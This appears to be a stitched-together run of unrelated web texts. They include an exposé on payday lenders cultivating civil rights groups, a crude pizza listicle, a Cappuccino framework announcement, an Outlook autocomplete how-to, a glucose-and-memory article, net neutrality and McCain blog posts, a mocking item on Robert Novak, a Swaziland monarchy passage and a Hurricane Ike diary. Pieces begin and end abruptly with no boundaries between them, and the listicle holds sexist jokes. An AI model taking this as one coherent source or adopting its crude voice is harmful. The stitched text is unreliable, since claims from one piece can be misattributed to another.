( In July , after another op - ed piece on a similar topic appeared under Steele ’s byline in a a handful of papers , he claimed he did n’t write it or authorize its release ; according to Steele ’s lawyer , a Washington public relations and lobbying firm was behind the commentary . )
The argument was an odd one coming from a civil rights group .
Most consumer groups believe that the subprime industry is largely predatory , and rife with abuses that disproportionately affect minorities .
But Steele ’s op - ed makes a lot more sense when you consider a detail the Post at first left out :
In August 2007 , the SCLC formed a partnership with CompuCredit , a subprime credit card issuer and payday lending company .
( The Post later updated its story to reflect this . )
The deal included plans for an affinity card that would put the famous civil rights group ’s name on CompuCredit Visa cards and joint “ economic empowerment ” workshops around the country to help educate minorities about credit .
When Steele announced the deal last year , he said , “ Consistent with SCLC ’s historic commitment to civil rights and economic justice , this partnership represents a critical part of our campaign for economic empowerment . ”
While the civil rights group has been lauding its corporate partner , the federal government has taken a slightly different view of CompuCredit ’s contributions to economic empowerment .
Last month , the Federal Trade Commission sued the company for unfair and deceptive trade practices , as well as violating the Fair Debt Collection Practices Act .
The FTC alleged that CompuCredit bilked consumers out of at least $ 217 million through a scheme in which consumers paid so much in fees that they rarely had any credit available on the company ’s Visa cards .
The CompuCredit cards are better known as “ fee harvesting ” cards — that is , credit cards sold to people in dire financial straits that have high interest rates , low credit balances , and lots and lots of fees for people who generally can’t afford them .
The practice is enormously lucrative .
The National Consumer Law Center reports that in 2006 , CompuCredit made $ 400 million in fees on such cards , simultaneously saddling consumers with more than $ 1 billion in debt .
The FTC also alleged that CompuCredit was working in tandem with its debt - collection arm , Jefferson Capital , in a complex scheme that used the credit cards as a way of duping consumers into paying off old debts that had been discharged by other lenders .
Far from lifting consumers upward , CompuCredit was leaving its customers mired in debt , from which they would have a tough time escaping .
The fraud allegations against the company do n’t seem to have soured the storied civil rights group ’s enthusiasm for it .
After the FTC filed its suit in June , Steele defended the company , saying that CompuCredit “ has been a true friend to the SCLC and to the communities and individuals it serves , and in our opinion is one of the few financial services companies that is working diligently to increase access to credit in underserved communities . ”
Steele did not return a call for comment .
Of CompuCredit ’s relationship with the SCLC , Tom Donahue , the company ’s director of corporate communications , says , “ As a company that provides credit products and financial services to financially underserved consumers , CompuCredit has an abiding interest in working with individuals and third - party organizations that share our commitment to financial education and to helping credit - challenged consumers bridge their way to a prime credit score and the financial mainstream . ”
William Jelani Cobb , a history professor at Atlanta ’s Spelman College who has followed the fortunes of the civil rights infrastructure , says that he was unaware of the SCLC ’s relationship with CompuCredit , but is not surprised by it .
“ It ’s an indictment of how far SCLC has gone from its historic roots .
These folks owe their existence to a moral claim to helping other black folks .
This is an outright betrayal of that . ”
SCLC is not the only civil rights group or black advocacy organization that has linked arms with CompuCredit and other companies that peddle high - interest credit and predatory loans to poor minority communities .
The fringe finance industry has intentionally tried to cultivate relationships with minority organizations as part of its lobbying campaign against stricter regulation , both at the state and federal level .
“ Just like they target minority groups to sell their products , they target minority groups to make their products look legitimate , ” says critic Keith Corbett , executive vice president of the Center for Responsible Lending ( CRL ) .
Three years ago , Al Sharpton went so far as to appear in TV commercials for LoanMax , a company that specializes in auto - title loans , whose 300 percent interest rates consumer advocates consider deeply predatory .
CompuCredit has participated in Jesse Jackson ’s Rainbow / PUSH
Coalition ’s career fairs and economic summits .
Local affiliates of the National Urban League , one of the nation ’s oldest civil rights groups , have worked with the payday lending industry trade group , the Consumer Financial Services Association ( CFSA ) , to conduct financial literacy seminars .
Denise Harrod , CompuCredit ’s vice president , has served on business committees of the National Conference of Black Mayors and the National Black Caucus of State Legislators , both of which have received money from the payday lending industry .
Payday lenders were popular honorees this year among civil rights groups celebrating the birthday of Martin Luther King Jr .
The president of CFSA , the payday lending industry lobby group , chaired the Congress of Racial Equality ’s ( CORE ) Martin Luther King Jr. awards dinner in January .
To honor the King holiday this year , SCLC gave its presidential award to CompuCredit ’s Harrod for her “ leadership in the struggle for economic justice through the political process . ”
The rationale behind the industry ’s cultivation of African American supporters is fairly simple .
Payday lenders and other corporations that specialize in predatory lending have only one really useful argument in defending their business practices , and it goes like this :
They provide a public service by catering to the “ unbanked ” and other financially underserved communities — i.e. , those discriminated against by white banks that wo n’t make loans to African Americans .
Without payday or other subprime lenders , they argue , many poor minorities would have no way of buying homes or keeping their lights on in an emergency .
It ’s a seductive argument , in part because it ’s based on a kernel of truth .
Black Americans in particular have indeed been shut out of mainstream banks for decades .
But as Corbett notes , loans with 300 percent interest rates are hardly a desirable alternative .
Nonetheless , the subprime and payday loan industries have been somewhat successful in fending off stricter regulation , in large part because they have recruited African Americans and civil rights groups to make the argument for them .
One of the most active groups on this front has been CORE , a group founded by James Farmer and others in 1942 , but which has long been more conservative than groups like SCLC .
CORE has long been happy to take money from just about any corporate donor .
Not long ago Mother Jones chronicled ; its role in helping Exxon fight global warming regulations .
But CORE has also been heavily involved in defending payday lending , a practice better known as “ legal loan sharking ” because of the enormous interest rates charged for the short - term loans .
According to CRL , the average payday loan borrower typically pays about $ 800 in interest for a $ 325 loan , and numerous studies have shown that payday lenders are disproportionately clustered in minority neighborhoods .
Payday lenders are also notoriously ruthless debt collectors .
Just one example : A New Mexico woman named Laura Cordova sued a payday lender in September 2006 after its collections workers started harassing her family , friends , and ultimately her boss and other people at her company , not just with phone calls but with visits to the office .
Cordova was eventually fired as a result .
Yet CORE ’s national spokesman , Niger Innis , testified last year against a bill that would ban payday lending in Washington State , saying , “ Payday lenders offer a choice that is not widely provided by traditional lenders anymore .
Consequently , we think that payday lenders provide a choice that members of our communities should be allowed to make . ”
The bill failed .
In Georgia last year , when the payday lending industry tried to roll back a relatively new ban on payday lending there , CORE lobbied heavily to overturn it , along with the Georgia Legislative Black Caucus , whose chairman , Rep. Al Williams , told the Associated Press , “ No one has explained to me how a person making $ 6 an hour and is about to get his lights turned off can go and get a loan . ”
Payday lenders and other fringe finance companies are not natural political allies with black political groups .
CompuCredit , for instance , was founded by Frank and David Hanna , Georgia businessmen who made a name for themselves in the mid-1990s by turning the nonprofit Blue Cross / Blue Shield of Georgia into a for - profit company and then allegedly plundering its assets .
The Hannas have donated heavily to Republican causes , providing some of the largest contributions to former Christian Coalition head Ralph Reed in his failed bid for Georgia ’s lieutenant governorship .
Frank Hanna is affiliated with a group of American Catholics who had lobbied bishops to refuse communion to John Kerry during the 2004 presidential campaign .
Not surprisingly , CompuCredit faced significant obstacles when it came to winning over African American political leaders who tend to be Democrats .
But money has helped , as has the strategic employment of African American lobbyists .
For instance , CFSA ’s lobbyist during the Georgia debate last year was Willie Green , a former wide receiver for the Denver Broncos and Carolina Panthers who owns a handful of payday lending outfits .
Before the legislature voted on the bill , Green gave an $ 80,000 loan to Rep.
Ron Sailor , an African American legislator who did n’t pay it back .
Sailor crossed party lines and voted in favor of the Republican bill .
Sailor pleaded guilty earlier this year for unrelated money - laundering charges .
( The bill failed to pass . )
In 2006 , CompuCredit hired J.C. Watts Companies , a firm run by the former Oklahoma congressman , who was the only black Republican in the US House of Representatives when he retired in 2002 .
CompuCredit paid Watts ’ firm $ 60,000 to lobby on its behalf when Congress was considering legislation to cap interest rates on payday loans to members of the military .
( The bill passed . )
Watts also gave the company entry to the nation ’s network of historically black colleges and universities , which has been a prime target of the payday loan industry .
( CFSA now offers paid internships to students at those schools to work in the corporate offices of big payday lending companies . )
In 2004 , Watts and CompuCredit launched a consumer financial literacy initiative through four historically black colleges and universities .
The partnership involved CompuCredit ’s funding market research and the development of a financial literacy curriculum for students .
( A call to Watts ’ company went unreturned . )
The notion of payday lenders offering classes on financial literacy is akin to Altria sponsoring anti-smoking classes .
After all , as the Center for Responsible Lending ’s Corbett observes with a laugh , “ If they improve financial literacy , black folks would never go to their stores . ”
Yet such programs have been a staple of the industry ’s PR efforts and they ’ve proliferated with the help of black advocacy groups .
( “ At this time , CompuCredit is not engaged in any activities directly related to historically black colleges and universities , ” says CompuCredit ’s Donahue .
“ We have never located any services — kiosk , portal , or other presence — on any college campus , and there are no plans to do so . ” )
In June 2007 , when many states were considering bans on payday lending , CFSA launched the “ Youth Learn & Save ” program , which provides high school and college kids with financial literacy rallies and summits .
The programs use a modified curriculum created by the Federal Deposit Insurance Corporation ( FDIC ) and even feature a workbook that includes a description of a predatory payday loan .
Presumably the instructors — payday loan company employees and owners themselves — can offer a unique perspective on that particular subject .
A brochure for one seminar held in January this year at a majority black high school in Texas says , “ Sharing Dr. King ’s Dream through Financial Literacy . ”
In June , the National Baptist Congress of Christian Education , the largest and oldest black religious convention in the country , hosted one of the events .
CFSA launched the financial literacy campaign last fall at Jackson State University in Mississippi , along with the National Conference of Black Mayors , which also got money to fund college scholarships .
Dora Muhammad , a spokesperson for the NCBM , says that the group no longer works with CFSA .
“ Once we learned of some of the practices and the impact on the communities , we terminated that relationship , ” she says .
In addition to the consumer education campaign , CFSA announced that it would partner with the National Black Caucus of States Institute , a public policy research center for black state legislators , to “ educate African American legislators and community leaders on critical issues regarding consumer credit . ”
CFSA also recently added a new grant program to its offerings through NBCSI .
Kathleen Moore , CFSA ’s director of partnering and program development , who previously worked at Habitat for Humanity , insists that such outreach programs have nothing to do with politics or generating business for her members .
“ I do not promote payday lending .
This is part of our giving - back agenda , ” she says .
“ None of our outreach is targeted at ethnicity . ”
Critics can be forgiven , however , for suspecting the worst .
Last September , Washington DC’s City Council was about to vote on a bill that would cap interest rates on payday loans at 24 percent , effectively banning the practice .
CFSA scheduled one of its “ Youth Learn & Save ” rallies days before the vote .
With promises of free food , a rap DJ , and an appearance by Kelvin Boston , the African American host of the PBS show Moneywise , CFSA had gotten several public high schools to let kids out of school for a field trip to a local Boys & Girls Club for a full day of financial literacy training conducted by some of the area ’s payday lenders .
CFSA had also promised to donate $ 10,000 to expand a Boys & Girls Club financial literacy program at one of the city ’s poorest , all - black high schools , and to give $ 100 savings bonds to all the participants .
When the DC school chancellor Michelle Rhee got wind of the event , which had not been officially sanctioned , she pulled the plug on it just before it was supposed to take place .
CFSA ’s Moore , who organized the event , blames the cancellation on industry opponents at the Center for Responsible Lending , who she claims threatened to picket outside .
She said CFSA decided to cancel the event rather than endanger the children .
“ We really did not want young people to be exposed to this ugliness , ” she says .
“ It ’s sad that they would put children in harm ’s way for a political point . ”
Moore , who says her group had already spent $ 40,000 on the rally when it was cancelled , claims that it had nothing to do with the council vote .
Did she know about the vote ?
“ Of course I did ! ” she says , but insists that the DC rally was simply part of the industry ’s larger community outreach efforts .
DC council member Mary Cheh , an original sponsor of the payday bill , is n’t buying it .
“ We ’re not fools .
The timing was exactly right for them to carry on their political campaign , ” she says .
In the run-up to the DC Council vote on payday lending , the industry continued to reach out to local black organizations .
Check ‘n Go , a major payday lender , donated a whopping $ 100,000 to the Anacostia Economic Development Corp. , to help minority entrepreneurs .
The group is headquartered in the ward of former mayor and now council member Marion Barry , who had been one of the original cosponsors of the payday lending bill .
Barry ended up as the lone vote against his own bill , which passed 12 - to - 1 .
Not everyone in the civil rights establishment has signed on with the payday lenders .
The NAACP has been active in fighting the industry .
In 2003 , NAACP chairman Julian Bond told a Utah newspaper , “ A drive through any low - income neighborhood clearly indicates people of color are a target market for legalized extortion .
Visits to payday stores — which open their doors in low - income neighborhoods at a rate equal to Starbucks opening in affluent ones — are threatening the livelihoods of hardworking families and stripping equity from entire communities . ”
But Corbett says that the industry has succeeded in diluting the black community ’s response to predatory lending .
“ Their strategy is to divide and conquer , ” he says .
“ If you ’ve picked off Al Sharpton , you ’ve won . ”

8. The Seedier the Better
If the pizza establishment looks too dirty for even Amy Winehouse to venture in at the tail end of a 3 day bender or you think you have a 50/50 chance of getting hepatitis , chances are they have the greatest pizza imaginable .
Unlike any other dish , the seedier the establishment the greater it is .
The best pizza ovens in NYC were constructed in the 1920's and 30's ... and the guys that run them usually look like they should be DOING 20 - 30 .
This combination = Pizza Perfection !
7. It Contains Enzymes That Makes Beer Taste 1,000 Times Better
While this is not based on scientific fact , from my own extensive beer / pizza studies , I have concluded with some confidence that this is not total BS .
Of course these are the same studies which have shown that with enough beer there is no such thing as a butterface and that white people can dance to 80 ’s music .
Both of which were later disproved after review of video evidence .
6. Delivery
Just like Russian mail order brides are delivered for guys who can't get laid ( or WoW addicts ) , pizza delivery is for those of us who can't cook , or are too lazy to operate a microwave .
The only difference is that pizza does n't plan on divorcing you as soon as it gets its green card , taking half your money and giving away your dog to some 8 year old punk in front of PetSmart .
5 . It ’s known as a Flavor
No other dish is known as a flavor .
You do n't see Egg Foo Young , Pad Thai Jae or even corned beef and cabbage flavored chips , do you ?
NO .
It 's PIZZA .
Why ?
Because it 's PERFECT .
You see it in Combos , Hot Pockets , and Pringles ... even those pesky little goldfish crackers know what 's up ...
Seriously , though , the day that I 'm eating pizza flavored ice cream with Marissa Miller ... naked ... my life will be complete .
4. Common Denominator
Pop quiz , you somehow managed to talk some girls you just met at the your local bar to come back to your place to hang out .
They say they 're hungry , what do you do ?
Your first instinct would be to order pizza because everyone in the world loves it ... but you are dead wrong .
This was a trick question !
You give them Jägerbombs and hope it hits them fast because it 's just a matter of time before they see your She - Ra collection and get the hell out of there .
3. Italian Made
Between the women and the cars , you know that anything coming from Italy would be nothing short of perfect .
And Pizza is no exception .
Like all of the insanely beautiful Italian models , pizza is a mix of so many unlikely elements that blend together into an almost unnaturally perfect beauty ... a combination so explosive , yet so palatable , no one can deny the fantastically phenomenal nature ... um , sorry , got carried away .
What I meant to say was , pizza , like Italy 's women , is fuckin' hot .
2. The Perfect 3 AM snack
The type of person who says Denny 's or Taco Bell is the perfect 3 AM snack , is the same type of person who actually thinks the Vanessa Hudgens look - a- like across the room is waving at them .
Really she ’s waving at her boyfriend who owns a Bentley and reps 225 lbs in their warmup set .
The big difference is that pizza joints do n't have the stench of despair which is found at 3 AM in a Denny 's or a Taco Bell drive through , but instead is replaced by the smell of apathetic mediocrity probably due to the massive joint that the staff smoked on break .
1 . It 's the only safe way to eat Pepperoni .
Look at that photo .
You do n't want to kill yourself , right ?
Keyshark also happens to write for a sweet site called BugeHoobs.com !
Back in June , the developers of 280 North released their first web app , called 280 Slides .
The Keynote - esque presentation software works so much like a desktop app , it 's sometimes hard to believe it runs in a browser .
But 280 North used an interesting way to build the app : instead of making HTML , CSS , and JavaScript try to work like an app framework , they instead ported a desktop app framework — Cocoa — to JavaScript .
The result of their work is Cappuccino , a port of Cocoa to run under Objective - J ; essentially , it 's an Objective - C- like JavaScript runtime .
As promised in June , both have now been released as open - source software under the LGPL .
Now , anyone with Cocoa programming experience can transfer a good chunk of their knowledge to create rich , desktop - like apps that run right in the browser .
Those with JavaScript experience should also be able to use Cappuccino without much difficulty , since Objective - J is a strict superset of JavaScript .
While 280 North 's approach to web app development is unique , Cappuccino 's web site has extensive documentation , tutorials , and links to plenty of resources to get you started .
And like I said before , if 280 Slides is any indication of what 's in store for Cappuccino - based apps , I 'm looking forward to doing more and more via the browser .
How - To How - To Clear the Outlook Email Address Autocomplete Cache By
How to clear the Outlook autocomplete cache in Outlook 2010 , Outlook 2007 and Outlook 2003 and remove old email addresses from your nk2 file .
Microsoft Outlook 2003 , Outlook 2007 , and Outlook 2010 have a feature called Email Address AutoComplete which many of us take for granted every day .
As you type an email address into the TO : , CC : , or BCC field , Outlook will display a list of matching email addresses from the Outlook AutoComplete cache ( IE : Email addresses you have already used . )
Here ’s an example :
As convenient as the AutoComplete feature is , there are times when you need to remove these cached email addresses from the cache .
For example , perhaps someone at work just lost his / her job , and the email address is no longer valid .
Or maybe you made a typo while sending an email and now that address is stuck in your cache .
The good news is getting rid of that address from your auto -c cache is simple no matter the Version of Outlook ( 2003 , 2007 , or 2010 . )
Just follow the steps below .
Solution :
The fix is easy :
Inside Outlook ,
Type the email address you wish to clear from the cache until Outlook displays it as shown above .
Press the down arrow key to select the email address and hit the delete button .
All Done .
That entry should now be gone from the Outlook Auto Complete cache .
Solution # 2 ( Nuclear Bomb ) :
This is another option if you want to delete all addresses in the cache file ( outlook.nk2 ) .
Note , Solution # 2 is for Outlook 2003 and 2007 only .
Read this post to clear the AutoComplete in 2010 .
Close Outlook Open Windows Explorer or IE and Paste %APPDATA % \Microsoft \Outlook into the address bar .
Delete the Outlook.nk2 file in this folder All Done Groovy !
Solution # 2 is comparable to the “ Nuclear Bomb ” being that it will delete ALL your cached email addresses .
It should only be used if you want to wipe the file clean or if you have corruption issues with your .nk2 file .
Once you delete the .nk2 file , then the next time you open Outlook it will automatically create a new .nk2 cache file , and Outlook will once again begin caching the email addresses you use .
But what if all you want to do is DISABLE the Outlook Auto Complete entirely ?
Easy .
I wrote about disabling the Autocomplete for Outlook 2010 and Outlook 2003 and 2007 earlier .
Take a look there , and you should be good to go !
Millions of older adults suffer from significant memory loss , despite the lack of a diagnosis of dementia - causing disease .
This memory loss can lead to a significant decline in quality of life and often remains undiagnosed and untreated .
Recently , however , scientists have begun to study the role of glucose regulation in cognitive enhancement of adults .
Cognitive function and short - term memory retrieval in middle - aged and older adults may now be linked to blood sugar levels .
The brain ’s primary source of fuel is glucose , unlike other organs that have multiple fuel sources .
Research has long shown that ingesting drinks or foods with high glucose content before high - demand short - term memory tasks improves cognitive performance .
However , people with better blood - sugar regulation performed better on the tests than those with poor glucose regulation .
In other words , the faster people metabolized blood sugar , the better their memory functioned .
Moderate increases in blood glucose are effective in enhancing short - term memory performance and cognitive functioning across an array of domains , but while a little glucose is good , too much can be bad .
Sustained elevations in blood sugar levels , as seen in conditions including impaired glucose tolerance and diabetes , lead to a decline in cognitive functioning .
Simply , the longer that the glucose remains in the blood , the less fuel the brain has to function and retain memories .
These findings are owed , at least in part , to the fact that glucose affects the hippocampus — the part of the brain responsible for short - term memory .
In one small study , people with high blood sugar levels actually had a smaller hippocampus than those with normal glucose regulation .
Any type of insult or injury to the brain , including high blood sugar , easily damages the hippocampus .
Fortunately , it is also a resilient part of the brain and its function can be recovered when blood sugar levels are controlled .
Recently , elevated blood sugar levels were found to be significant predictors of poor cognitive performance or mild cognitive impairment among middle - aged and elderly subjects .
Adults with higher fasting blood sugar levels performed worse on memory function tests , whether they received glucose or a placebo prior to the test .
These findings are also linked to lifestyle factors .
Study participants that had poor glucose regulation , leading to high blood sugar levels , had more risk factors for poor overall health , diet , and lifestyle .
People with known risk factors for diabetes or impaired glucose tolerance are at risk for elevated blood sugar levels , in addition to any person who is overweight or has a sedentary lifestyle .
The research requires more investigation before glucose - regulation becomes a mainstay of memory loss treatments , but it provides more incentive for adults to maintain healthy blood sugar levels .
Not only does a healthy , active lifestyle prevent heart disease , diabetes , joint ailments , and a plethora of other conditions , but it also improves memory and cognitive functioning .

The Net Neutrality Strawman : No One Is Stopping Broadband Providers From Charging More
from the understanding - net - neutrality dept
Net neutrality proponents .... would prohibit Internet service providers from using price to address the ever - growing popularity of streaming video and other bandwidth - intensive programs that cause bottlenecks .

While I do n't think that passing laws in favor of net neutrality is necessarily the right way to go about things , it really is amazing to watch anti-net neutrality types completely make up bogus arguments in favor of their position .
We pointed this out exactly two years ago , when lobbyist Mike McCurry wrote a blatantly bogus editorial , claiming that Google did n't pay a cent for its broadband bills , and that it was arguing in favor of net neutrality to avoid having to pay for broadband .
This was an outright lie -- and I challenged McCurry to agree to pay Google 's bandwidth bill .
Not surprisingly , McCurry declined -- though , the organization he represents , Hands Off The Internet , has shown that it reads Techdirt and does n't mind quoting us out of context when it furthers its telco - funded argument .
Yet , here we are again , with anti-net neutrality supporters are making completely bogus claims about how net neutrality somehow prevents them from charging more .
The Wall Street Journal is running an anti-Kevin Martin editorial , claiming that his decision to sanction Comcast for traffic shaping is a victory for net neutrality supporters , and then stating : That 's simply untrue .
No one is saying they can't charge more for bandwidth .
Again , does anyone really believe that Google is n't paying a ridiculously large bandwidth bill ?
Instead , as Tim Lee describes , net neutrality has absolutely nothing to do with price .
What the telcos are really trying to do is get you to payfor thebandwidth .
That 's because internet connectivity has always been about paying for the connection from your home to the " cloud . "
We each pay for that connectivity from the ends , to the middle of the network .
So , note , all of those connections are fully paid for .
What the telcos are trying to do with breaking net neutrality isget companies providing services to payfor connectivity from that middle out to users .
As you 'll recall , those users have already paid for that bandwidth themselves .
So , the telcos are , in effect , looking to double charge for bandwidth already charged for .
This has huge implications when you think about it .
After all , if everyone providing content and services to the middle also has to pay to deliver that to the ends , then it makes the initial connection that muchvaluable .
Telcos may be shooting themselves in the foot by trying to do this .
In double charging companies for the bandwidth consumers are already paying for , they may make it such that consumers are a lot less willing to pay for it , since it will be a lot less useful .
Note thatsays that the telcos can't charge what they want for the initial bandwidth -- from the customer to the middle .
Net neutrality advocates are simply saying it does n't make sense to then chargeto send content from the middle outward .
After all , it 's already paid for , and who pays for " half a connection " anyway ?
The reason you pay for a connection is to get on the net .
Not to get to the middle where the next tollbooth exists .

Boiling bile - duct of right - wing rage Robert Novak earlier today struck a pedestrian with his black C5 Corvette , then attempted to flee the scene of the accident .
According to witnesses , Novak plowed into the man as he was crossing the street on a walk signal , throwing the victim across the windshield and onto the ground .
Novak then proceeded to make a right turn and continue as if nothing happened .
A nearby bicyclist chased the pundit down and stopped him by parking his bike in front of the ' Vette .
When confronted , Novak claimed he did n't know he had hit anyone .

When police arrived at the scene they ticketed Novak for failure to yield ; however , other charges may be pending .
The 60 - year - old pedestrian was treated for injuries at George Washington University Hospital and later released .
We 're assuming Novak will plead not guilty , as the pedestrian was a liberal scumbag who failed to yield to the conservative reality of his ' Vette 's bumper .

That question was as confounding as it was impertinent .
In the government ’s latest budget , about $ 30 million was set aside for “ royal emoluments . ”
But surely the king ’s income exceeds that , people said .
The royal family also controls a corporate business empire “ in trust for the nation , ” investing in sugar cane , commercial property and a newspaper .
Forbes.com recently listed Mswati III as the world ’s 15th wealthiest monarch , estimating his fortune at $ 200 million .
But is this not the way of the world ?
The king , after all , is the king .
The poor , after all , are the poor .
Percy Simelane , the government ’s spokesman , was quoted by Agence France - Presse last week as saying : “ Poverty has been with us for many years .
We cannot then sit by the roadside and weep just because the country is faced with poverty .
We have made great strides as a country that gives us pleasure in celebrating 40 years of independence and the king ’s birthday . ”
Indeed , most of Swaziland ’s 1.1 million people love their monarch .
God gave the country to the king , many of them say , and the king was given to the people by God.
Mswati III ’s father , Sobhuza II , had been especially revered .
He was more frugal than his son , transporting the royal family in buses instead of BMWs .
But he , too , liked to marry .
It was said that he took 70 wives , though some put the number as high as 110 .
Image Maidens carrying reeds in Ludzidzini on Monday .

Sobhuza II was king when the nation shed the yoke of colonialism , finally free of Britain yet left with a British - style Constitution .
The esteemed monarch did not abide by this document for long .
In 1973 , he dissolved Parliament and rid himself of the annoyance of political parties .
In the years ahead , political reformers , primarily city people , pushed for democracy .
Mswati III succeeded his father in 1986 , and in 2005 , after much give and take , signed a new Constitution .
But it was a peculiar document , guaranteeing individual liberties with one hand and preserving the absolute monarchy with the other .
The king would continue to appoint the prime minister and members of the governing cabinet and the judiciary .
When McCain opposes his own legislation
Over the last year or so , when John McCain was struggling to get his presidential campaign back on track , one of his more notable challenges was reinventing himself — again .
When he got to Congress , McCain was a rather conventional conservative Republican .
After his role in the Keating Five scandal , McCain took on a reform - minded persona .
By 1999 , he was a self - described “ maverick ” and moderate , who would move the GOP to the center .
By 2004 , McCain was back to being a conservative again .
By 2007 , he had positioned himself as an establishment Republican , and when that did n’t work out , McCain decided he ’d become some kind of hybrid of the various McCains of the recent past .
If I did n’t know better , I ’d say McCain has very few core values , and is willing to shift with the wind to get ahead .
It ’s one of the reasons he ’s flip - flopped all over the place throughout the campaign .
This became especially clear the other night at the Republican debate in Simi Valley , when McCain was asked whether he ’d vote for the immigration - reform legislation he introduced in 2006 .
He responded that the bill wo n’t come to the floor of the Senate .
Of course , that was n’t the question .
HOOK : I know [ it wo n’t come to the floor ] , but what if it did ?
MCCAIN : No , I would not , because we know what the situation is today .
The people want the border secured first .
And so to say that that would come to the floor of the Senate , it wo n’t . [… ]
COOPER : So I just want to confirm .
You would not vote for your bill as it originally was — MCCAIN : My bill will not be voted on .
It will not be voted on .
That ’s obviously quite a bit of evasion for Mr. “ Straight Talk , ” but it got me thinking : how many McCain - sponsored bills is McCain prepared to vote against ?
Let ’s see …
* He said this week that he ’d vote against his own immigration plan .
* McCain used to champion the Law of the Sea convention , even volunteering to testify on the treaty ’s behalf before a Senate committee .
Now , if the treaty comes to the Senate floor , he ’s vowed to vote against it .
* McCain was a co-sponsor of the DREAM Act , which would grant legal status to illegal immigrants ’ kids who graduate from high school .
In 2007 , to make the far - right base happy , he voted against the bill he had taken the lead on .
* In 2006 , McCain sponsored legislation to require grassroots lobbying coalitions to reveal their financial donors .
In 2007 , after receiving “ feedback ” on the proposal , McCain told far - right activist groups that he now opposes the measure he ’d backed .
* McCain used to support major campaign - finance reform measures that bore his name .
In June 2007 2006 , McCain announced his opposition to a major McCain - Feingold provision .
It ’s one thing to shift with the political winds , and I ’ll gladly concede that there are worse qualities in a presidential candidate than changing one ’s mind about a policy matter or two .
Indeed , McCain has been in Congress for a quarter - century ; he ’s bound to shift now and then on various issues .
But these are n’t just random bills that McCain voted on — these are bills that he personally championed — recently .
And now , after McCain sponsored the bills , he ’s not even willing to vote for them anymore .
And even that would n’t be entirely beyond the pale , except one of McCain ’s principal selling points is his alleged consistency and willingness to take politically unpopular decisions .
Something to keep in mind as general election strategies unfold .

First , I like to thank everybody who expressed their concern for my safety and well being as Hurricane Ike passed through the Houston / Galveston area .
The hurricane left Houston , the US ’s fourth - largest city , and its surrounding areas battered and bruised and was reduced to near paralysis in some places .
As the power companies take their time restoring electricity , I wonder if anyone has noticed how Houston is serviced by one power company , CenterPoint Energy , that furnishes electricity to the area .
Even though I signed up with a different electric provider , I am still at the mercy of CenterPoint because they are the local grid operator , which handles and services the electric grid .
This is a result of the deregulation of electric services in Texas .
Since CenterPoint controls the grid , they are responsible for all power failures .
As of last Friday Sept 19 , of the total 2.2 million who lost power , 1.3 million are still without power .
Not only that , my entire apartment complex did not have water for the entire week , despite Mayor Bill White ’s assurance that water pressure is back to normal levels .
During that time , I had to look for places that were open so I could avoid a build up of dirty dishes , while at the same time my laundry began piling up , my appearance began to suffer , and the water I stored in my bathtub for flushing my toilet was beginning to run critically low .
This is not the first hurricane I have been through a hurricane .
In fact I did go through Hurricane Alicia .
I also went through several tropical storms .
This also not the first time I actually blogged a major hurricane .
In 2005 , I did the same thing with Hurricane Rita .
There was something about Ike that made this one different than the previous ones I went through .
One day before Ike made its presence felt , on Sept 11 , Harris County and City of Houston officials told people who were n’t living in Zone A & B of the evacuation zone to ride this out .
This was done so the city would repeat the same mistakes three years ago and the steps New Orleans Mayor Ray Nagin took with Gustav .
It is hard for people who live outside the Texas Gulf Coast to fully understand why so many decided to stay and ride out the storm .
For some , the Rita evacuation process that took place three years ago is still fresh in people ’s minds .
When Rita was predicted to hit Galveston and Houston , more than 3 million people hit the roads almost simultaneously .
When it was our turn to leave , it was being reported that people were stopped in traffic for hours in the Texas heat , many ran out of fuel waiting to get out , and there were rumors of traffic accidents .
The gridlock was so bad , there was a fear if Rita did come in at a certain angle , it would have been a “ death trap ” if you were stranded on the road .
As fellow Houstonian and blogamigo DP put it , “ that was an experience I would n’t wish on my worst enemy . ”
I do n’t except people to “ get it ” because it is something one has to personally experience to fully understand .
When Ike finally arrived Saturday morning , the National Hurricane Center reported that the hurricane maintained it ’s 110 mph wind speed , therefore classifying it as a strong category 2 hurricane on the Saffir - Simpson scale , 1 mph shy of becoming a major category 3 ( winds 111- 130 mph ) .
In other words , Hurricane Ike was a borderline Category 2/3 .
I would be lying if I said Ike did n’t have an impact on me .
Recently , I seem to have trouble concentrating , my sleep patterns is a bit off , my apatite has decreased , and for the past couple of days I have been reminiscing about the roaring wind and rain of that night .
I hate to say it , but it seemed like it went on for hours with no end in sight .
I think I only got 2 hours of sleep .
During the storm , I noticed something very eerie outside my window , the natural light that normally enters through the window , there were periods when the light would disappear right before my eyes , as somebody put a was putting a cover over the apartment complex because the room would suddenly become pitch black .
I found some accounts of others reporting the same thing .
Those who survived the storm in Galveston also noticed the same phenomenon .
Nanc , told CNN ’s Anderson Cooper , “ it turned completely black , you could n’t see five feet in front of you . ”
As the southern eyewall approached , that is when things really started rocking .
A storm chaser noted that the “ southern eyewall was very similar to Katrina in duration and relentlessness . ”
Around 5:30 AM , the winds began pounding my apartment so hard I was sure that the next massive gust would implode my sliding glass door or my bedroom window .
Because the rain fall sideways during a hurricane , the pounding of the blistering rain against my sliding glass door sounded like someone got a handful of pebbles and threw it at my door non-stop .
Throughout the night , as I hunkered down in my walk - in closet located inside the bathroom where the wall muffled the frightening sound , however , Ike made sure it ’s presence was still felt .
As I huddled on the floor with my dogs , I felt the apartment sway back and forth a couple of times , which brought about flashbacks of the first time I experienced an earthquake in Los Angeles .
I do have to admit , I was lucky .
Despite the rocking , there was no damage to my apartment , however , there were some within my apartment complex that were n’t so lucky .
Throughout the week , it was obvious that the people who lived on the bottom floor or in the mid-rise part of the complex were has rain enter as they were drying their towels outside .
One tenant told me their entire ceiling was filled with water .
As for my parents ’ condo , they did sustain some minor flooding .
I think in the wake of Hurricane Katrina , there has been an unfair comparison between the tragedies Katrina left and the one left by other storms .
In today ’s post - Katrina coverage , if damage pales in comparison to Katrina , in the eyes the national media , it ’s not going to be seen as a “ big deal . ”
What people and the media have to keep in mind , Houston is n’t dependent on vulnerable levees or below sea level .
However , damage from the storm was extensive .
Thousands of homes and government buildings flooded , roads were washed out , power lines were down and parts of trees and roofs were everywhere .
Highways were full of debris , shredded billboards and cars stalled in high water .
It will take several months and millions of dollars to replace the glass in Houston ’s skyscrapers that was shattered by Hurricane Ike .
Some of the city ’s big corporations did not open their offices until Tuesday because the building sustained water damage .
The city ’s theater district was flooded and shards of glass blown out of downtown skyscrapers littered the streets .
Ike ’s winds ripped off windows on Chevron Corp ’s two main towers at 1500 Louisiana and 1400 Smith .
All windows on one side of Chase JP Morgan were blown out .
